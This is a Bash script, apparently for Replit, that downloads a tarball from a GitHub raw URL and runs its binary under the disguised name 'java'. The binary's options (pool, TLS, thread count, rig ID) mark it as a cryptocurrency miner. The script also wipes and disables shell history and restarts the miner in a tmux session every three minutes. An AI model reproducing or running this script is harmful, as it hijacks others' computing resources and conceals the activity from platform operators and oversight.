#!/bin/bash

SESSION="java"
DOMAIN="$1"
NAME_WORK="$2"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

if ! command -v tmux >/dev/null 2>&1; then
  echo '{ pkgs }: { deps = [ pkgs.tmux ]; }' > replit.nix \
  && tmux
fi

# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/java/java" ]; then
    echo "[+] Downloading ..."
    rm -rf java java.tar.gz
    curl -sL -o java.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
    tar -xzf java.tar.gz
    chmod +x java/java
    rm -f java.tar.gz
fi

# 🔁 Kiểm tra và chạy lại nếu session không tồn tại
echo "[+] Vòng lặp kiểm tra session mỗi 3 phút ..."
while true; do
    if ! tmux has-session -t $SESSION 2>/dev/null; then
        tmux new-session -s $SESSION -d
        tmux send-keys -t $SESSION "
            $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
        " C-m
    else
        echo "[+] start process start process start process start process start process start process - chạy 3 phút check lai..."
    fi
    sleep 180   # 3 phút check 1 lần
done
